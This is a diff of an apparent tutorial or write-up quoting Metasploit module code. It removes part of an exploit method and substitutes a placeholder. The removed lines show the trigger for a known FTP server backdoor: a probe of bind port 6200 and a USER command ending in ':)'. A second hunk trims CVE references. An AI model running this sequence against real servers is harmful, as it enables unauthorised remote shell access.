@@ -155,26 +155,6 @@ class Metasploit3 < Msf::Exploit::Remote
 
                 register_options([ Opt::RPORT(21) ], self.class)
         end
-
-        def exploit
-
-                nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
-                if nsock
-                        print_status("The port used by the backdoor bind listener is already open")
-                        handle_backdoor(nsock)
-                        return
-                end
-
-                # Connect to the FTP service port first
-                connect
-
-                banner = sock.get_once(-1, 30).to_s
-                print_status("Banner: #{banner.strip}")
-
-                sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
-                resp = sock.get_once(-1, 30).to_s
-                print_status("USER: #{resp.strip}")
-
 # More Ruby Code HERE.....
 ```
 
@@ -245,5 +225,5 @@ class Metasploit3 < Msf::Exploit::Remote
                                 [
                                         [ 'CVE', '2007-2447' ],
                                         [ 'OSVDB', '34700' ],
-
+# More Ruby Code HERE.....
 ```
